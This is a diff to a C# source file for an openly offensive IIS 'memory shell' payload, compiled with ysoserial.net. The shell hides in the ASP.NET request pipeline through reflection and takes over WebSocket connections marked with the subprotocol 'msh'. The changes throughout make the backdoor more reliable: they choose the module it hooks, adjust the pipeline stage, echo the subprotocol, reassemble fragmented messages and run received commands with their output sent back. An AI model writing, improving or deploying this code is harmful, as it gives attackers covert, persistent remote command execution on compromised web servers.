@@ -1,21 +1,24 @@
-// payloads/WsTakeoverShell.cs
+﻿// payloads/WsTakeoverShell.cs
 // ---------------------------------------------------------------------------
 // Memory shell #2: WebSocket connection takeover (the .NET port of the WebSocket
 // memory-shell idea: take the connection away from request/response processing).
 //
-// Insertion point : the HTTP -> WebSocket upgrade transition. The shell rides the site's
-//                   existing 80/443 endpoints (no new port, no http.sys registration).
-// Trigger         : a WebSocket handshake whose Sec-WebSocket-Protocol contains "msh".
+// Insertion point : the HTTP -> WebSocket upgrade transition. Rides the site's existing
+//                   80/443 endpoints (no new port, no http.sys registration).
+// Trigger         : a WebSocket handshake whose Sec-WebSocket-Protocol contains the exact
+//                   token "msh".
 // Impact          : non-handshake requests are a strict no-op; only the marked connection
 //                   is upgraded to a full-duplex command channel.
 // Compiled by     : ysoserial.net -g XamlAssemblyLoadFromFile
 //                   -c "payloads\WsTakeoverShell.cs;System.dll;System.Web.dll"
-// Environment     : IIS integrated pipeline + WebSocket feature enabled (both are the
-//                   common defaults on Server 2012+); AcceptWebSocketRequest throws otherwise.
+// Environment     : IIS integrated pipeline (HttpRuntime.UsingIntegratedPipeline) with the
+//                   WebSocket Protocol feature enabled. On classic/self-host pipelines
+//                   AcceptWebSocketRequest throws and the handler passes the request through.
 // ---------------------------------------------------------------------------
 
 using System;
 using System.Diagnostics;
+using System.IO;
 using System.Net.WebSockets;
 using System.Reflection;
 using System.Text;
@@ -72,16 +75,26 @@ public class E
             if (getC == null) return false;
 
             object container = null;
-            FieldInfo mcF = t.GetField("_moduleCollection", F);
-            object mc = mcF != null ? mcF.GetValue(app) : null;
-            if (mc != null)
+            string[] preferred = new string[] {
+                "Session", "AspNetFilterModule", "DefaultAuthentication", "UrlRoutingModule-4.0"
+            };
+            foreach (string k in preferred)
             {
-                string[] keys = (string[])mc.GetType().GetProperty("AllKeys").GetValue(mc, null);
-                foreach (string k in keys)
+                try { container = getC.Invoke(app, new object[] { k }); } catch { }
+                if (container != null) break;
+            }
+            if (container == null)
+            {
+                FieldInfo mcF = t.GetField("_moduleCollection", F);
+                object mc = mcF != null ? mcF.GetValue(app) : null;
+                if (mc != null)
                 {
-                    try { container = getC.Invoke(app, new object[] { k }); }
-                    catch { }
-                    if (container != null) break;
+                    string[] keys = (string[])mc.GetType().GetProperty("AllKeys").GetValue(mc, null);
+                    foreach (string k in keys)
+                    {
+                        try { container = getC.Invoke(app, new object[] { k }); } catch { }
+                        if (container != null) break;
+                    }
                 }
             }
             if (container == null) return false;
@@ -94,7 +107,7 @@ public class E
                 if (mi.Name == "AddEvent") { addEvent = mi; break; }
             if (addEvent == null) return false;
 
-            addEvent.Invoke(container, new object[] { RequestNotification.BeginRequest, false, step });
+            addEvent.Invoke(container, new object[] { RequestNotification.AcquireRequestState, false, step });
             return true;
         }
         catch { return false; }
@@ -143,35 +156,55 @@ public class E
         {
             HttpContext ctx = HttpContext.Current;
             if (ctx == null || !ctx.IsWebSocketRequest) return;
-            string proto = ctx.Request.Headers["Sec-WebSocket-Protocol"];
-            if (proto == null || proto.IndexOf(MagicSubprotocol, StringComparison.OrdinalIgnoreCase) < 0) return;
+            if (!HasSubprotocol(ctx.Request.Headers["Sec-WebSocket-Protocol"], MagicSubprotocol)) return;
 
-            // Connection takeover: the request pipeline terminates here and the upgraded
-            // duplex stream is owned by Duplex() for the lifetime of the connection.
-            ctx.AcceptWebSocketRequest(Duplex);
+            // Echo the selected subprotocol explicitly; without this the 101 may omit
+            // Sec-WebSocket-Protocol and strict clients may refuse the connection.
+            AspNetWebSocketOptions options = new AspNetWebSocketOptions();
+            options.SubProtocol = MagicSubprotocol;
+            ctx.AcceptWebSocketRequest(Duplex, options);
+
+            // The handler chain continues after this step, so its page output must be kept out
+            // of the upgraded connection: suppress content and pin the 101 status, or the
+            // WebSocket pipeline is torn down (WebSocketException 0x80070040). RemapHandler is
+            // unavailable at this stage - the framework permits it only before MapRequestHandler.
+            ctx.Response.SuppressContent = true;
+            ctx.Response.StatusCode = 101;
         }
         catch { }
     }
 
-    private static Task Duplex(AspNetWebSocketContext c)
+    private static bool HasSubprotocol(string header, string token)
+    {
+        if (string.IsNullOrEmpty(header)) return false;
+        foreach (string p in header.Split(','))
+            if (string.Equals(p.Trim(), token, StringComparison.OrdinalIgnoreCase)) return true;
+        return false;
+    }
+
+    private static async Task Duplex(AspNetWebSocketContext c)
     {
         WebSocket ws = c.WebSocket;
         byte[] buf = new byte[65536];
+        MemoryStream acc = new MemoryStream();
         while (ws.State == WebSocketState.Open)
         {
-            WebSocketReceiveResult r =
-                ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None).GetAwaiter().GetResult();
+            WebSocketReceiveResult r = await ws.ReceiveAsync(
+                new ArraySegment<byte>(buf), CancellationToken.None).ConfigureAwait(false);
             if (r.MessageType == WebSocketMessageType.Close)
             {
-                ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None).GetAwaiter().GetResult();
+                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye",
+                    CancellationToken.None).ConfigureAwait(false);
                 break;
             }
-            string cmd = Encoding.UTF8.GetString(buf, 0, r.Count);
+            acc.Write(buf, 0, r.Count);
+            if (!r.EndOfMessage) continue;   // assemble fragmented messages
+            string cmd = Encoding.UTF8.GetString(acc.ToArray());
+            acc.SetLength(0);
             byte[] outb = Encoding.UTF8.GetBytes(Exec(cmd) ?? "");
-            ws.SendAsync(new ArraySegment<byte>(outb), WebSocketMessageType.Text, true,
-                CancellationToken.None).GetAwaiter().GetResult();
+            await ws.SendAsync(new ArraySegment<byte>(outb), WebSocketMessageType.Text, true,
+                CancellationToken.None).ConfigureAwait(false);
         }
-        return Task.FromResult(0);
     }
 
     private static string Exec(string cmd)
@@ -193,3 +226,5 @@ public class E
         catch (Exception ex) { return ex.Message; }
     }
 }
+
+
